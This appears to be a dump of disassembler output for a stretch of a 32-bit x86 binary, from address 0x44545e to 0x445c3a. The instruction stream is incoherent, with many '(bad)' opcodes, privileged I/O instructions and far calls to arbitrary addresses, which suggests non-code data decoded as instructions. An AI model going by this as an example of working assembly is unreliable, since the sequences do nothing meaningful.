  44545e:	fist   WORD PTR [eax-0x4b]
  445461:	je     0x44544f
  445463:	push   edx
  445464:	ret    
  445465:	jl     0x445461
  445467:	fs push ebp
  445469:	xchg   BYTE PTR [edx],dl
  44546b:	mov    ah,0x5c
  44546d:	loope  0x44547f
  44546f:	xchg   ebx,eax
  445470:	les    esp,FWORD PTR [esi]
  445472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445473:	(bad)  
  445474:	fmul   QWORD PTR ds:0xb088a9cd
  44547a:	test   BYTE PTR [esi-0x29],0xfb
  44547e:	dec    esp
  44547f:	or     eax,0x524c3e6a
  445484:	xor    DWORD PTR [ebp+0x69],0x541cf248
  44548b:	add    al,0xb0
  44548d:	jmp    0xee87d4eb
  445492:	shl    BYTE PTR [eax+ecx*1-0x53],cl
  445496:	push   eax
  445497:	mov    edx,0x42f4ba26
  44549c:	call   0x1663c17e
  4454a1:	ds (bad) 
  4454a3:	cmp    al,0x6a
  4454a5:	stos   BYTE PTR es:[edi],al
  4454a6:	mov    eax,ds:0x4b6190be
  4454ab:	sbb    BYTE PTR [edi-0xfca2bdf],cl
  4454b1:	cwde   
  4454b2:	push   cs
  4454b3:	lock rol BYTE PTR [edx+0xe84eb5],0xdc
  4454bb:	sbb    al,0x84
  4454bd:	ss cmp al,0x53
  4454c0:	fdivr  DWORD PTR [edx]
  4454c2:	fs jle 0x445493
  4454c5:	inc    ecx
  4454c6:	and    BYTE PTR [eax],0x8a
  4454c9:	and    eax,0x423607ad
  4454ce:	cmp    al,0x39
  4454d0:	sahf   
  4454d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4454d2:	push   eax
  4454d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4454d4:	rcr    bl,cl
  4454d6:	add    ah,cl
  4454d8:	pop    ds
  4454d9:	mov    dh,0xe3
  4454db:	cwde   
  4454dc:	sub    ah,BYTE PTR [ebp+ebx*8-0x26]
  4454e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4454e1:	push   esp
  4454e2:	jae    0x4454af
  4454e4:	adc    BYTE PTR [edx-0x3456d1e6],ch
  4454ea:	add    al,0x7e
  4454ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4454ed:	push   ebp
  4454ee:	add    BYTE PTR [edx],bh
  4454f0:	push   esp
  4454f1:	fst    QWORD PTR fs:[esi+ecx*8-0x2e4383da]
  4454f9:	inc    esp
  4454fa:	mov    ds:0x40d88065,eax
  4454ff:	inc    edi
  445500:	jne    0x445516
  445502:	cmc    
  445503:	adc    dh,cl
  445505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445507:	add    BYTE PTR ds:[esi],bh
  44550a:	push   eax
  44550b:	js     0x4454b5
  44550d:	loop   0x445502
  44550f:	push   0x5082b362
  445514:	cmc    
  445515:	adc    edx,DWORD PTR [esi+0x48]
  445518:	out    0xc6,eax
  44551a:	and    BYTE PTR [edx+ecx*1-0x50],dh
  44551e:	pop    ss
  44551f:	inc    edx
  445520:	(bad)
  445523:	add    BYTE PTR [eax+eax*2-0x55dac095],bl
  44552a:	je     0x4455a4
  44552c:	push   ss
  44552d:	push   cs
  44552e:	lods   al,BYTE PTR ds:[esi]
  44552f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445530:	jl     0x4454d8
  445532:	hlt    
  445533:	cwde   
  445534:	xchg   esp,eax
  445535:	inc    esi
  445536:	sahf   
  445537:	mov    dl,0x12
  445539:	fisub  WORD PTR [edi]
  44553b:	sbb    ch,BYTE PTR [edi]
  44553d:	inc    esp
  44553e:	dec    esp
  44553f:	and    ah,dh
  445541:	sbb    ah,BYTE PTR [ecx-0x257be6ce]
  445547:	sbb    dl,ah
  445549:	out    dx,al
  44554a:	xor    al,0x1a
  44554c:	cmp    dh,BYTE PTR [eax-0x1f5b5a64]
  445552:	sbb    eax,0xce0df880
  445557:	(bad)  
  445558:	fisttp WORD PTR [eax-0x4fed850a]
  44555e:	mov    ds:0xcd10e588,al
  445563:	jle    0x4454fb
  445565:	pop    edx
  445566:	sub    ebx,DWORD PTR [ebx+0x33]
  445569:	inc    ecx
  44556a:	je     0x445566
  44556c:	aad    0x16
  44556e:	clc    
  44556f:	loope  0x44555a
  445571:	push   edi
  445572:	or     BYTE PTR [ebx+eiz*1+0x2e5ab851],dh
  445579:	fldcw  WORD PTR [eax+0x8d09687]
  44557f:	fs jb  0x4455f8
  445582:	je     0x445543
  445584:	add    al,0xe2
  445586:	adc    eax,0xd2a6be12
  44558b:	fucomp st(5)
  44558d:	rol    al,cl
  44558f:	verw   WORD PTR [edx]
  445592:	and    BYTE PTR es:[edi+0x10],al
  445596:	push   esi
  445597:	pop    esp
  445598:	push   edx
  445599:	retf   
  44559a:	dec    esp
  44559b:	push   ecx
  44559c:	jp     0x445608
  44559e:	push   ebx
  44559f:	add    al,0xe0
  4455a1:	and    eax,0x17025da1
  4455a6:	xchg   ebx,eax
  4455a7:	(bad)  
  4455a8:	addr16 push ecx
  4455aa:	scas   eax,DWORD PTR es:[edi]
  4455ab:	mov    ah,0xc
  4455ad:	scas   eax,DWORD PTR es:[edi]
  4455ae:	cmp    al,BYTE PTR [eax-0xd]
  4455b1:	push   0x2ec9e230
  4455b6:	pop    ss
  4455b7:	xor    al,0x46
  4455b9:	xor    ah,BYTE PTR [esi-0x71]
  4455bc:	gs ins BYTE PTR es:[edi],dx
  4455be:	mov    dh,0x39
  4455c0:	imul   eax,DWORD PTR [esi+edx*4+0x62],0x6cbab22e
  4455c8:	push   esp
  4455c9:	fdivr  st,st(5)
  4455cb:	daa    
  4455cc:	inc    eax
  4455cd:	mov    fs:0x684cfb32,eax
  4455d3:	jnp    0x445577
  4455d5:	xchg   esi,eax
  4455d6:	repz xor al,0xf6
  4455d9:	sbb    al,0x10
  4455db:	lock or DWORD PTR [edx-0x28],edi
  4455df:	or     eax,0x5c9d7aab
  4455e4:	test   eax,0x443d9b0e
  4455e9:	rol    DWORD PTR [edx+0x52],cl
  4455ec:	mov    al,ds:0xbcff4581
  4455f1:	xor    eax,0xbe073780
  4455f6:	sub    BYTE PTR [esp+ebp*2+0x0],bh
  4455fa:	rcl    al,0x52
  4455fd:	rol    BYTE PTR [edx+0xc0fd026],1
  445603:	(bad)  
  445605:	mov    cl,0xe8
  445607:	pop    esp
  445608:	icebp  
  445609:	int3   
  44560a:	enter  0x46a2,0xf9
  44560e:	add    BYTE PTR [esi],ch
  445610:	add    cl,dl
  445612:	push   edx
  445613:	ins    BYTE PTR es:[edi],dx
  445614:	adc    bh,BYTE PTR ds:0xc3fc6400
  44561a:	repnz push ss
  44561c:	mov    bh,0x2a
  44561e:	fcomp  st(2)
  445620:	xchg   ecx,eax
  445621:	inc    eax
  445622:	scas   al,BYTE PTR es:[edi]
  445623:	arpl   ax,dx
  445625:	call   0xbe02b11e
  44562a:	adc    bh,BYTE PTR [esi-0x2e]
  44562d:	(bad)  
  44562e:	out    0xb5,al
  445630:	push   ss
  445631:	jb     0x44562b
  445633:	push   eax
  445634:	das    
  445635:	imul   ebp,DWORD PTR [eax-0x686f275a],0x1b762b72
  44563f:	sbb    bh,BYTE PTR [eax]
  445641:	cmp    BYTE PTR [edi+0xa],ch
  445644:	cli    
  445645:	add    DWORD PTR [eax],0xfffffff6
  445648:	and    DWORD PTR [ebx-0xd],ebp
  44564b:	cmp    edi,DWORD PTR [eax-0x6c9e1f00]
  445651:	sub    BYTE PTR [esi+edx*1+0x0],ch
  445655:	pop    eax
  445656:	and    BYTE PTR [esi-0x5f99b3de],0x9a
  44565d:	leave  
  44565e:	jecxz  0x4455ea
  445660:	les    esp,FWORD PTR [ebx+0x40]
  445663:	je     0x445611
  445665:	clc    
  445666:	adc    dh,BYTE PTR [edx+0x506941ad]
  44566c:	ds cli 
  44566e:	fs push ebx
  445670:	jge    0x44566c
  445672:	sub    ecx,DWORD PTR [eax]
  445674:	or     ebx,DWORD PTR [edx+ebx*1+0x2a]
  445678:	sti    
  445679:	std    
  44567a:	inc    esp
  44567b:	push   es
  44567c:	and    eax,0x85a8c124
  445681:	push   ds
  445682:	mov    ah,0xd4
  445684:	or     eax,0xf2d293f6
  445689:	mov    ds:0x8230902a,eax
  44568e:	push   cs
  44568f:	push   ecx
  445690:	sub    al,0xb8
  445692:	mov    al,ds:0xd742680
  445697:	scas   al,BYTE PTR es:[edi]
  445698:	xchg   edx,eax
  445699:	es cmovo edi,eax
  44569d:	sub    DWORD PTR [ebp+ebp*4+0x2e],ebx
  4456a1:	pusha  
  4456a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4456a3:	ds add dl,0x9e
  4456a7:	sbb    eax,0xeae1d704
  4456ac:	mov    eax,ds:0x2d3cc7a5
  4456b1:	and    bh,dh
  4456b3:	clc    
  4456b4:	pushf  
  4456b5:	add    BYTE PTR [edx+0x7b],bl
  4456b8:	and    eax,0x64bb1b92
  4456bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4456be:	mov    dl,0x36
  4456c0:	pop    ds
  4456c1:	xor    dh,al
  4456c3:	xchg   edx,eax
  4456c4:	cmp    ah,BYTE PTR [eax+0x4d621e83]
  4456ca:	arpl   bx,bp
  4456cc:	push   0x22
  4456ce:	or     bl,BYTE PTR [ecx+eiz*8-0x12]
  4456d2:	shl    DWORD PTR [esi],1
  4456d4:	ins    DWORD PTR es:[edi],dx
  4456d5:	neg    BYTE PTR [ebx]
  4456d7:	jp     0x4456e1
  4456d9:	mov    ebp,0xc50e2276
  4456de:	les    ebx,FWORD PTR [eax-0x9]
  4456e1:	xchg   edx,eax
  4456e2:	adc    al,0x55
  4456e4:	lock and BYTE PTR [edx+edi*4+0x30],al
  4456e9:	mov    WORD PTR [esi],ds
  4456eb:	or     BYTE PTR [eax+0x64],bl
  4456ee:	mov    edx,ds
  4456f0:	jne    0x4456e3
  4456f2:	into   
  4456f3:	jmp    0x4456cf
  4456f5:	pusha  
  4456f6:	mov    ds:0xc9ce143d,al
  4456fb:	popf   
  4456fc:	push   edx
  4456fd:	test   eax,0xf8878805
  445702:	rcr    BYTE PTR [edi],cl
  445704:	pop    ebx
  445705:	push   0x1b0e899b
  44570a:	js     0x445755
  44570c:	loopne 0x44571f
  44570e:	pop    eax
  44570f:	jb     0x445715
  445711:	jmp    0x2bf9f85e
  445716:	fdiv   QWORD PTR [esp+esi*8]
  445719:	stos   DWORD PTR es:[edi],eax
  44571a:	les    ebx,FWORD PTR [esi]
  44571c:	std    
  44571d:	mov    dl,0xb1
  44571f:	dec    ecx
  445720:	and    cl,BYTE PTR [eax-0x13bb7384]
  445726:	and    BYTE PTR [eax+0x2004f594],ch
  44572c:	xor    al,0xa8
  44572e:	or     BYTE PTR [edx+edx*2],bh
  445731:	fsub   DWORD PTR [esp+ebx*1-0x4b302212]
  445738:	int3   
  445739:	test   esi,edx
  44573b:	jbe    0x4457b2
  44573d:	nop
  44573e:	dec    edi
  44573f:	pop    esp
  445740:	fisub  WORD PTR [ecx-0x6ad71a2a]
  445746:	add    ebx,DWORD PTR [ebx-0x25]
  445749:	and    esp,DWORD PTR [esi+0x31]
  44574c:	sub    BYTE PTR ds:0x6c4c38ac,0xcf
  445753:	ret    0x48d1
  445756:	scas   al,BYTE PTR es:[edi]
  445757:	mov    al,ds:0xc227e328
  44575c:	imul   ecx,DWORD PTR [ebx+0xf],0x2e
  445760:	(bad)  
  445761:	or     dl,BYTE PTR [eax+0x2d]
  445764:	xchg   edi,eax
  445765:	ret    
  445766:	pusha  
  445767:	sbb    eax,0x7291e089
  44576c:	jbe    0x445746
  44576e:	pavgw  mm0,QWORD PTR [esi]
  445771:	sub    esi,DWORD PTR [ebp+eax*2-0x4d]
  445775:	inc    eax
  445776:	dec    eax
  445777:	int    0xe3
  445779:	clc    
  44577a:	push   0x749814fc
  44577f:	(bad)  
  445780:	and    BYTE PTR [ecx+esi*8],bh
  445783:	add    BYTE PTR [edi+ecx*1+0x47caa858],al
  44578a:	or     bl,al
  44578c:	mov    al,ds:0xc25f2046
  445791:	push   0xfffffff4
  445793:	pop    edx
  445794:	ror    BYTE PTR [esi-0x4f0c8d3f],1
  44579a:	ret    0xb64f
  44579d:	nop
  44579e:	push   edx
  44579f:	sti    
  4457a0:	or     BYTE PTR [esi+0x5c1fb829],0x41
  4457a7:	ret    0x9c95
  4457aa:	xor    BYTE PTR [eax-0x78f593c8],al
  4457b0:	xchg   esi,eax
  4457b1:	push   esi
  4457b2:	mov    al,ds:0xafd4a6ec
  4457b7:	dec    eax
  4457b8:	stos   BYTE PTR es:[edi],al
  4457b9:	push   0x99f80650
  4457be:	retf   0x1e73
  4457c1:	sbb    bl,al
  4457c3:	call   0x4504:0xd6ab9a92
  4457ca:	push   edx
  4457cb:	mov    dl,0x77
  4457cd:	pop    esi
  4457ce:	rcr    edx,0xdc
  4457d1:	fs ss add ah,ah
  4457d5:	fs out dx,eax
  4457d7:	and    ch,ah
  4457d9:	and    al,0xb2
  4457db:	inc    edx
  4457dc:	mov    ds:0xc0c4b8c8,eax
  4457e1:	pop    edx
  4457e2:	dec    esi
  4457e3:	inc    eax
  4457e4:	cmp    BYTE PTR [esi+0x53],0xf8
  4457e8:	sbb    dh,BYTE PTR [ebx]
  4457ea:	sub    bl,BYTE PTR [ebp-0x5ddb8727]
  4457f0:	cmp    eax,0x228a83b8
  4457f5:	adc    DWORD PTR [ebx+edi*1+0x27b5aa9c],ecx
  4457fc:	adc    esp,esp
  4457fe:	imul   esp,edx,0xffffffef
  445801:	xchg   esp,eax
  445802:	xchg   ecx,eax
  445803:	test   eax,0x24b0163d
  445808:	xchg   ebx,eax
  445809:	out    dx,eax
  44580a:	mov    WORD PTR [edx],cs
  44580c:	xchg   esp,eax
  44580d:	mov    esi,0x78101c4a
  445812:	fs pusha 
  445814:	test   eax,0xcfe08edc
  445819:	and    al,0x2a
  44581b:	or     BYTE PTR [edi+ebx*4],dl
  44581e:	mov    BYTE PTR [ebx+eiz*2+0x12],bl
  445822:	scas   eax,DWORD PTR es:[edi]
  445823:	adc    BYTE PTR [edi],0xc8
  445826:	imul   ecx,DWORD PTR [ecx-0x7b6875e6],0xbf4640b6
  445830:	mov    ds:0x342f75aa,eax
  445835:	xchg   edi,eax
  445836:	ds or  eax,0x83807c6c
  44583c:	and    ah,BYTE PTR [eax+ecx*1+0x42d05e82]
  445843:	or     BYTE PTR [esi],0xd0
  445846:	mov    WORD PTR [eax-0x79],fs
  445849:	or     edi,edx
  44584b:	sub    al,0xfd
  44584d:	dec    edx
  44584e:	in     al,0xea
  445850:	sub    DWORD PTR [esi-0x38],ebx
  445853:	fcmovbe st,st(4)
  445855:	test   DWORD PTR [ecx+0x5e],edx
  445858:	mov    ecx,0xae57a4e1
  44585d:	pusha  
  44585e:	sti    
  44585f:	push   es
  445860:	sbb    dl,BYTE PTR [esi-0x74]
  445863:	fcmovb st,st(1)
  445865:	mov    eax,0x588ea74
  44586a:	push   esi
  44586b:	jl     0x445807
  44586d:	hlt    
  44586e:	mov    ds,WORD PTR [esi+0x5560e0f2]
  445874:	pop    ebx
  445875:	pop    ss
  445876:	cld    
  445877:	jecxz  0x4458b9
  445879:	call   DWORD PTR ds:0x8dca93c
  44587f:	sub    BYTE PTR [eax],dl
  445881:	push   esp
  445882:	neg    BYTE PTR [eax+ebp*1-0x3ded14a4]
  445889:	das    
  44588a:	into   
  44588b:	pop    ebx
  44588c:	std    
  44588d:	jl     0x4458c3
  44588f:	fs cld 
  445891:	xchg   BYTE PTR [eax+0x4abecfec],dh
  445897:	popa   
  445898:	cwde   
  445899:	(bad)  
  44589a:	and    esi,DWORD PTR [ecx+0x35]
  44589d:	inc    BYTE PTR [eax]
  44589f:	xchg   ebp,eax
  4458a0:	adc    eax,0x68449fba
  4458a5:	adc    DWORD PTR [eax+0x44],0xcde97f90
  4458ac:	jle    0x445908
  4458ae:	js     0x445924
  4458b0:	aaa    
  4458b1:	jecxz  0x445901
  4458b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4458b4:	jmp    0x445862
  4458b6:	pop    esi
  4458b7:	rol    DWORD PTR [eax],1
  4458b9:	fild   DWORD PTR [ecx-0x76e16273]
  4458bf:	push   edx
  4458c0:	lock imul eax,DWORD PTR [esi],0xae2b8889
  4458c7:	jns    0x4458c7
  4458c9:	in     al,dx
  4458ca:	popa   
  4458cb:	or     DWORD PTR [edi-0x8c51378],ebx
  4458d1:	dec    esp
  4458d2:	xor    BYTE PTR [ecx-0x5c430aec],ah
  4458d8:	cli    
  4458d9:	(bad)  
  4458db:	fsub   DWORD PTR [edx+edx*2]
  4458de:	out    dx,al
  4458df:	mov    WORD PTR [esi],ss
  4458e1:	pop    edx
  4458e2:	mov    edx,0x2fbc542
  4458e7:	cmc    
  4458e8:	(bad)  [edx+0x1798545e]
  4458ee:	jbe    0x445918
  4458f0:	mov    eax,ds:0x98204281
  4458f5:	jg     0x4458a3
  4458f7:	inc    ebx
  4458f8:	sbb    bh,BYTE PTR [eax-0x50]
  4458fb:	inc    esp
  4458fc:	rol    esi,cl
  4458fe:	out    dx,eax
  4458ff:	sub    al,0x7d
  445901:	mov    al,ds:0x7caff2d4
  445906:	call   0x7a9e:0x915a10d7
  44590d:	cwde   
  44590e:	cwde   
  44590f:	mov    edx,0xa610e2e
  445914:	pop    ebx
  445915:	mov    ebx,0x1ea616ec
  44591a:	mov    dl,0xc6
  44591c:	jne    0x44591e
  44591e:	ds dec edx
  445920:	cli    
  445921:	(bad)  
  445922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445923:	pop    es
  445924:	mov    ah,0x3f
  445926:	je     0x4458aa
  445928:	mov    al,0xe1
  44592a:	push   ebx
  44592b:	mov    cs,WORD PTR [eax]
  44592d:	xor    BYTE PTR [ecx-0x59],0xc0
  445931:	jp     0x445994
  445933:	mov    esp,0xc63c4568
  445938:	add    esi,DWORD PTR [esi+0x4b]
  44593b:	lods   eax,DWORD PTR ds:[esi]
  44593c:	dec    edx
  44593d:	(bad)  
  44593e:	call   0x5363:0xf2107d22
  445945:	cdq    
  445946:	xor    bh,BYTE PTR [eax]
  445948:	fcom   DWORD PTR [eax+esi*2-0x3fe7819b]
  44594f:	dec    edi
  445950:	dec    esi
  445951:	jl     0x445903
  445953:	retf   0xabe0
  445956:	mov    al,0xe1
  445958:	retf   0x7802
  44595b:	inc    ebx
  44595c:	cmp    bl,bl
  44595e:	jp     0x445958
  445960:	pusha  
  445961:	jge    0x4458e7
  445963:	cmp    ch,ah
  445965:	push   ss
  445966:	adc    dl,BYTE PTR [ebx+0x5a5a7e86]
  44596c:	in     eax,0xcc
  44596e:	add    BYTE PTR [ebp+ecx*1-0x3dc172c2],bl
  445975:	mov    bl,0xad
  445977:	(bad)  
  445978:	pop    eax
  445979:	cwde   
  44597a:	push   edx
  44597b:	add    BYTE PTR [eax+0x20],bl
  44597e:	inc    esi
  44597f:	push   edi
  445980:	xchg   ebx,eax
  445981:	or     DWORD PTR [eax],esi
  445983:	push   ss
  445984:	pop    esp
  445985:	cwde   
  445986:	inc    edi
  445987:	js     0x445996
  445989:	mov    ds:0xd4098ec9,al
  44598e:	ss push es
  445990:	mov    ds:0x9e0823b6,al
  445995:	out    0xa,al
  445997:	sub    BYTE PTR [ecx],ch
  445999:	xlat   BYTE PTR ds:[ebx]
  44599a:	aaa    
  44599b:	lods   al,BYTE PTR ds:[esi]
  44599c:	xchg   edi,eax
  44599d:	mov    BYTE PTR [ecx+0x65],dh
  4459a0:	ds hlt 
  4459a2:	into   
  4459a3:	add    ebp,DWORD PTR [eax+0x43]
  4459a6:	push   ebx
  4459a7:	in     eax,dx
  4459a8:	loop   0x44595e
  4459aa:	fimul  DWORD PTR [edx-0x2f]
  4459ad:	mov    al,ds:0xaf6c05f0
  4459b2:	outs   dx,DWORD PTR ds:[esi]
  4459b3:	jp     0x4459b9
  4459b5:	and    edi,DWORD PTR ds:0x68ac2be
  4459bb:	jmp    0x445951
  4459bd:	enter  0x94d5,0xfe
  4459c1:	ja     0x445957
  4459c3:	iret   
  4459c4:	xchg   esp,eax
  4459c5:	pusha  
  4459c6:	mov    al,0xcd
  4459c8:	mov    al,ds:0xbe07685e
  4459cd:	imul   esp,DWORD PTR [eax-0x75],0xbc21dd0
  4459d4:	cwde   
  4459d5:	call   0xb1696d34
  4459da:	dec    esi
  4459db:	jle    0x445a3d
  4459dd:	and    dh,BYTE PTR [ebx+0x68]
  4459e0:	adc    ecx,esi
  4459e2:	xor    BYTE PTR [eax-0x2c],dl
  4459e5:	push   cs
  4459e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4459e7:	push   ds
  4459e8:	ret    
  4459e9:	pop    eax
  4459ea:	aam    0xe7
  4459ec:	add    ebx,DWORD PTR [eax+0x7e60a0d9]
  4459f2:	cmp    BYTE PTR [esi+esi*8-0x6e9ed35],al
  4459f9:	(bad)  
  4459fa:	pop    eax
  4459fb:	in     al,0x27
  4459fd:	retf   
  4459fe:	hlt    
  4459ff:	xchg   esi,eax
  445a00:	inc    esi
  445a01:	jle    0x4459e9
  445a03:	or     BYTE PTR es:[ebx+0x4a],cl
  445a07:	jo     0x44599f
  445a09:	sbb    eax,esi
  445a0b:	mov    bh,0xa1
  445a0d:	call   0xa809:0xf889e3aa
  445a14:	xchg   esi,eax
  445a15:	mov    eax,0x688c8966
  445a1a:	xor    ecx,ebx
  445a1c:	ds cli 
  445a1e:	div    BYTE PTR [esi+0x7f885676]
  445a24:	(bad)  
  445a25:	test   al,0xa6
  445a27:	shr    DWORD PTR [ecx-0x52],0xe
  445a2b:	cmp    eax,0xe0007806
  445a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445a31:	and    ch,BYTE PTR [edi+0x2]
  445a34:	pop    edx
  445a35:	jg     0x445a13
  445a37:	daa    
  445a38:	test   eax,0xd91a42f6
  445a3d:	sbb    ah,0x84
  445a40:	or     al,al
  445a42:	mul    BYTE PTR [eax]
  445a44:	jmp    0x445a43
  445a46:	mov    edi,esp
  445a48:	enter  0x1134,0x62
  445a4c:	aam    0x5
  445a4e:	jmp    0x92f4:0x560a3290
  445a55:	xchg   ebx,eax
  445a56:	cmp    BYTE PTR [eax],al
  445a58:	xchg   edx,eax
  445a59:	cli    
  445a5a:	push   edx
  445a5b:	sar    DWORD PTR [esi],0xca
  445a5e:	push   0x45a4f09a
  445a63:	sbb    eax,0xb2fc2dbe
  445a68:	mov    al,0x86
  445a6a:	js     0x445a92
  445a6c:	mov    BYTE PTR [ebx-0x1e9be121],bh
  445a72:	add    edx,ecx
  445a74:	push   ss
  445a75:	outs   dx,BYTE PTR ds:[esi]
  445a76:	xor    al,0xd1
  445a78:	mov    cl,BYTE PTR [ebx]
  445a7a:	or     BYTE PTR [ebx],bh
  445a7c:	js     0x445ad3
  445a7e:	mov    DWORD PTR [eax],esi
  445a80:	xlat   BYTE PTR ds:[ebx]
  445a81:	xchg   esp,eax
  445a82:	shl    BYTE PTR [edx],1
  445a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445a85:	mov    eax,ds:0xd4a43019
  445a8a:	pushf  
  445a8b:	cmp    al,0xa6
  445a8d:	icebp  
  445a8e:	sbb    ecx,DWORD PTR [esi]
  445a90:	(bad)  
  445a91:	push   ecx
  445a92:	cs xor esi,esi
  445a95:	(bad)  
  445a96:	in     al,dx
  445a97:	pop    ss
  445a98:	or     eax,0x9a94322e
  445a9d:	jo     0x445a79
  445a9f:	mov    BYTE PTR ds:0x868ed926,al
  445aa5:	nop
  445aa6:	je     0x445b0f
  445aa8:	mov    esi,0x52163052
  445aad:	mov    bl,0x89
  445aaf:	out    0xe0,al
  445ab1:	add    BYTE PTR [edi-0x4a5539f7],ch
  445ab7:	es loop 0x445a92
  445aba:	(bad)  
  445abb:	fldcw  WORD PTR [edx+0x74]
  445abe:	jbe    0x445aeb
  445ac0:	xchg   ebx,eax
  445ac1:	inc    eax
  445ac2:	jnp    0x445acd
  445ac4:	fdiv   DWORD PTR [ebx]
  445ac6:	aad    0x28
  445ac8:	inc    ecx
  445ac9:	or     eax,0x45e04fc
  445ace:	loop   0x445af4
  445ad0:	ins    BYTE PTR es:[edi],dx
  445ad1:	mov    ds:0x68585ed2,al
  445ad6:	aas    
  445ad7:	fs in  eax,dx
  445ad9:	mov    ebp,0x9c9cd2b8
  445ade:	mov    ebp,0x93acaaa4
  445ae3:	retf   0x42f4
  445ae6:	sub    BYTE PTR [eax+0x12],0xe5
  445aea:	pop    edx
  445aeb:	ss pop ds
  445aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445aee:	mov    DWORD PTR [esi+ebx*1],0x160bc06a
  445af5:	xchg   esi,eax
  445af6:	pushf  
  445af7:	sub    al,BYTE PTR [edx+edx*8]
  445afa:	pop    ss
  445afb:	fcom   QWORD PTR [esi+0x66]
  445afe:	lods   al,BYTE PTR ds:[esi]
  445aff:	outs   dx,BYTE PTR gs:[esi]
  445b01:	pop    ebx
  445b02:	xlat   BYTE PTR ds:[ebx]
  445b03:	fdivr  DWORD PTR [eax+0x211412ac]
  445b09:	xchg   edx,eax
  445b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445b0b:	add    al,BYTE PTR [ecx]
  445b0d:	add    eax,0xaaa4d31e
  445b12:	jbe    0x445b54
  445b14:	jecxz  0x445b29
  445b16:	rcr    BYTE PTR [ebp+0x5f],0xca
  445b1a:	push   edi
  445b1b:	and    BYTE PTR [eax-0x1e3d7d82],0x16
  445b22:	mov    esp,0x2c266f70
  445b27:	mov    edi,eax
  445b29:	or     al,0x90
  445b2b:	loop   0x445b0d
  445b2d:	xchg   BYTE PTR ds:0x35c0005c,cl
  445b33:	sbb    DWORD PTR [esi+0xcf6ad9],0x1a
  445b3a:	push   es
  445b3b:	shl    DWORD PTR [eax],0xa8
  445b3e:	inc    esi
  445b3f:	lahf   
  445b40:	jecxz  0x445ac9
  445b42:	add    BYTE PTR [esi+eax*8+0x3a0c2b37],ch
  445b49:	xchg   edi,eax
  445b4a:	test   BYTE PTR [edx],0x80
  445b4d:	inc    edi
  445b4e:	outs   dx,BYTE PTR ds:[esi]
  445b4f:	and    eax,0x142cb873
  445b54:	sbb    cl,BYTE PTR [edx-0x2b041946]
  445b5a:	cmc    
  445b5b:	into   
  445b5c:	es inc ecx
  445b5e:	push   esp
  445b5f:	push   ebx
  445b60:	(bad)  
  445b61:	nop
  445b62:	stos   DWORD PTR es:[edi],eax
  445b63:	adc    cl,BYTE PTR [edx+0x31eb4874]
  445b69:	rcr    bh,0xe8
  445b6c:	inc    eax
  445b6d:	ds mov ah,0x35
  445b70:	xor    eax,0x7ac21a54
  445b75:	shl    BYTE PTR [edi],1
  445b77:	call   0x9584:0x10b87911
  445b7e:	mov    ah,0xd2
  445b80:	retf   0xd9b5
  445b83:	dec    edi
  445b84:	or     DWORD PTR [eax-0x5c58e17],edx
  445b8a:	adc    al,0xef
  445b8c:	daa    
  445b8d:	ins    BYTE PTR es:[edi],dx
  445b8e:	fisub  DWORD PTR [ebx]
  445b90:	or     BYTE PTR [edi+0x4dc643a],ah
  445b96:	in     al,dx
  445b97:	push   esi
  445b98:	(bad)  
  445b99:	outs   dx,BYTE PTR ds:[esi]
  445b9a:	adc    ah,bl
  445b9c:	xchg   BYTE PTR [eax+0x54],bh
  445b9f:	call   0x412:0x4be09088
  445ba6:	mov    ds:0x362647b3,al
  445bab:	inc    edx
  445bac:	pop    edx
  445bad:	mov    eax,0x58170618
  445bb2:	add    al,0xe0
  445bb4:	mov    ds:0x4a70440c,al
  445bb9:	mov    es,esp
  445bbb:	dec    edi
  445bbc:	pop    eax
  445bbd:	pop    eax
  445bbe:	push   ds
  445bbf:	and    al,0xe4
  445bc1:	dec    esp
  445bc2:	add    al,ah
  445bc4:	jp     0x445bca
  445bc6:	retf   
  445bc7:	hlt    
  445bc8:	aam    0xa8
  445bca:	(bad)  
  445bcb:	hlt    
  445bcc:	icebp  
  445bcd:	test   eax,0x4c16202d
  445bd2:	push   es
  445bd3:	adc    BYTE PTR [esi+0x34743052],dh
  445bd9:	jnp    0x445c40
  445bdb:	sub    BYTE PTR [ebx+esi*2+0xa],bh
  445bdf:	mov    dl,0x7f
  445be1:	pusha  
  445be2:	daa    
  445be3:	push   ebp
  445be4:	int    0x4c
  445be6:	push   esp
  445be7:	mov    al,ds:0x20583ef3
  445bec:	pushf  
  445bed:	push   edx
  445bee:	and    ebx,DWORD PTR [eax-0x41]
  445bf1:	lods   eax,DWORD PTR ds:[esi]
  445bf2:	or     BYTE PTR [eax+ecx*2],bl
  445bf5:	push   edx
  445bf6:	or     DWORD PTR cs:0x90c88285,edx
  445bfd:	pushf  
  445bfe:	lock ror BYTE PTR [edx+0x2da9968],1
  445c05:	retf   0x5fac
  445c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445c09:	or     BYTE PTR [edi+0x30],0x26
  445c0d:	mov    ?,WORD PTR [eax+0xd]
  445c10:	mov    eax,ds:0x1a87f05a
  445c15:	call   0xf11fb430
  445c1a:	je     0x445bbd
  445c1c:	(bad)  
  445c1d:	jmp    0x5018:0xd6931cc3
  445c24:	mov    bl,0x68
  445c26:	adc    eax,DWORD PTR [esi+0x2]
  445c29:	push   0x50
  445c2b:	adc    eax,0xf410a01e
  445c30:	push   0x86020ca4
  445c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c36:	mov    ah,0xb9
  445c38:	in     al,0x28
  445c3a:	ds jmp 0x111e:0x26fcb446
